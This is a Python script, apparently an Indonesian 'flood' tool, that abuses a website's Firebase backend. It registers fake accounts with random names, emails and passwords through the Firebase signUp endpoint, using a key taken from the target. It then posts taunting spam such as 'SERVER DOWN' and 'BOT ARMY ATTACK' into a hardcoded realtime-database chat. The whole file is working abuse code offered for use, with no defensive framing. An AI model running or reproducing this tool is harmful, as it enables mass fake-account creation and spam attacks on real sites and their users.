#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ╭━━━〔 ✦ FahryZZFlood ✦ 〕━━━╮
# │  ★彡 Flood Banjir Chat 彡★  │
# ╰━━━━━━━━━━━━━━━━━━━━━━━━╯

import requests
import random
import string
import time
import threading
from datetime import datetime
import sys
import re
from colorama import init, Fore, Style

init(autoreset=True)

# Warna
CYAN = Fore.CYAN
BLUE = Fore.BLUE
GREEN = Fore.GREEN
RED = Fore.RED
YELLOW = Fore.YELLOW
MAGENTA = Fore.MAGENTA
RESET = Style.RESET_ALL

def print_banner():
    banner = f"""
{BLUE}╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
│  {CYAN}✧ F A H R Y Z Z   F L O O D ✧{BLUE}  │
│     {MAGENTA}★ Flood Chat Banjir ★{BLUE}      │
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯{RESET}
"""
    print(banner)

def random_username():
    adj = ["Crimson", "Shadow", "Phantom", "Silent", "Rapid", "Blazing", "Frost", "Thunder", "Venom", "Chaos"]
    noun = ["Wolf", "Eagle", "Falcon", "Tiger", "Dragon", "Ghost", "Reaper", "Hunter", "Strike", "Storm"]
    num = str(random.randint(1, 9999))
    return random.choice(adj) + random.choice(noun) + num

def random_email():
    domains = ["gmail.com", "yahoo.com", "outlook.com", "protonmail.com", "mail.com"]
    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(6, 12)))
    return f"{name}@{random.choice(domains)}"

def random_password():
    chars = string.ascii_letters + string.digits + "!@#$%"
    return ''.join(random.choices(chars, k=random.randint(8, 15)))

def random_message_text():
    templates = [
        "FLOOD ACTIVE 🔥", "FahryZZ On Top 😈", "SERVER DOWN", "BANJIR CHAT 💀",
        "FLOOD MODE ON", "⚡ FLOOD ⚡", "HAHAHA BOT AKTIF", "BYE BYE SERVER",
        "🔥🔥🔥 FLOOD 🔥🔥🔥", "FAHRYZZ FLOOD TOOLS", "TSUNAMI CHAT 🌊",
        "BOT ARMY ATTACK", "TAKE THE L", "EZZZZ WIN", "FLOOD SUCCESS"
    ]
    return random.choice(templates)

def register_account(target_url, idx, total, message):
    """Register fake account dan kirim pesan flood"""
    username = random_username()
    email = random_email()
    password = random_password()
    
    # Data register sesuai struktur Firebase di target
    register_data = {
        "email": email,
        "password": password,
        "displayName": username
    }
    
    # Endpoint firebase auth (dari HTML target)
    firebase_key = "MASUKKAN_FIREBASE_KEY_TARGET"
    signup_url = f"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={firebase_key}"
    
    try:
        # Register
        resp = requests.post(signup_url, json={
            "email": email,
            "password": password,
            "returnSecureToken": True
        }, timeout=10)
        
        if resp.status_code == 200:
            data = resp.json()
            id_token = data.get("idToken")
            local_id = data.get("localId")
            
            # Kirim pesan ke chat publik
            chat_url = f"https://website-data-2f3b8-default-rtdb.firebaseio.com/chat.json?auth={id_token}"
            chat_data = {
                "uid": local_id,
                "senderName": username,
                "role": "member",
                "text": message if message else random_message_text(),
                "time": datetime.now().strftime("%H:%M"),
                "timestamp": int(time.time() * 1000)
            }
            requests.post(chat_url, json=chat_data, timeout=5)
            return True, username
    except:
        pass
    return False, username

def flood_worker(target_url, total, message, results):
    """Worker untuk flood"""
    success_count = 0
    for i in range(total):
        success, username = register_account(target_url, i, total, message)
        if success:
            success_count += 1
            print(f"{GREEN}[✓] Bot {i+1}/{total} - {username} - Pesan terkirim{RESET}")
        else:
            print(f"{RED}[✗] Bot {i+1}/{total} - Gagal{RESET}")
        time.sleep(random.uniform(0.5, 1.5))  # Delay biar ga overload
    results[0] = success_count

def loading_bar(percent, total_bots):
    bar_length = 30
    filled = int(bar_length * percent // 100)
    bar = "█" * filled + "▒" * (bar_length - filled)
    print(f"\r{BLUE}╭━━━〔 LOADING... 〕━━━╮{RESET}")
    print(f"{BLUE}┃ {CYAN}{bar}{YELLOW} {percent}% ✦   {BLUE}┃{RESET}", end="")
    print(f"\r{BLUE}╰━━━━━━━━━━━━━━━━━━━━╯{RESET}", end="")
    sys.stdout.flush()

def main():
    print_banner()
    
    # Input link
    print(f"{CYAN}╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮{RESET}")
    target_url = input(f"{CYAN}┃{RESET} {YELLOW}Masukkan Link Target:{RESET} {CYAN}").strip()
    print(f"{CYAN}╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯{RESET}")
    
    if not target_url.startswith("http"):
        target_url = "https://" + target_url
    
    # Input jumlah flood
    print(f"{CYAN}╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮{RESET}")
    try:
        total_flood = int(input(f"{CYAN}┃{RESET} {YELLOW}Masukkan Jumlah Flood (Max 15):{RESET} {CYAN}"))
        if total_flood > 15:
            print(f"{RED}┃ ✗ Maksimal 15!{RESET}")
            print(f"{CYAN}╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯{RESET}")
            return
        if total_flood < 1:
            print(f"{RED}┃ ✗ Minimal 1!{RESET}")
            return
    except:
        print(f"{RED}┃ ✗ Input angka!{RESET}")
        print(f"{CYAN}╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯{RESET}")
        return
    print(f"{CYAN}╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯{RESET}")
    
    # Input pesan
    print(f"{CYAN}╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮{RESET}")
    custom_message = input(f"{CYAN}┃{RESET} {YELLOW}Masukkan Pesan Untuk Mereka 😈:{RESET} {CYAN}").strip()
    print(f"{CYAN}╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯{RESET}")
    
    if not custom_message:
        custom_message = None
    
    # Mulai flood
    print(f"\n{MAGENTA}╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮{RESET}")
    print(f"{MAGENTA}┃        MEMULAI FLOOD CHAT...        ┃{RESET}")
    print(f"{MAGENTA}╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯{RESET}\n")
    
    # Tampilkan status awal
    for i in range(min(total_flood, 5)):
        now = datetime.now()
        print(f"{CYAN}┏━━━〔 SYSTEM STATUS 〕━━━━━━━━━━━━━━┓{RESET}")
        print(f"{CYAN}┃ {now.strftime('%H:%M')} / {now.strftime('%A').upper()[:3]},{now.strftime('%d/%m/%y')} / :FLOODZ:{i+1} ┃{RESET}")
        print(f"{CYAN}┃               [ {i+1} ]                ┃{RESET}")
        print(f"{CYAN}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛{RESET}\n")
    
    results = [0]
    
    # Jalankan flood di thread
    thread = threading.Thread(target=flood_worker, args=(target_url, total_flood, custom_message, results))
    thread.start()
    
    # Animasi loading bar
    for percent in range(0, 101, 2):
        loading_bar(percent, total_flood)
        time.sleep(0.05)
    print()
    
    thread.join()
    
    # Hasil akhir
    print(f"\n{GREEN}╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮{RESET}")
    print(f"{GREEN}│     ★ Succes Membuat Flood 😈 ★     │{RESET}")
    print(f"{GREEN}│      {results[0]}/{total_flood} Bot Berhasil      │{RESET}")
    print(f"{GREEN}╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯{RESET}")

if __name__ == "__main__":
    main()
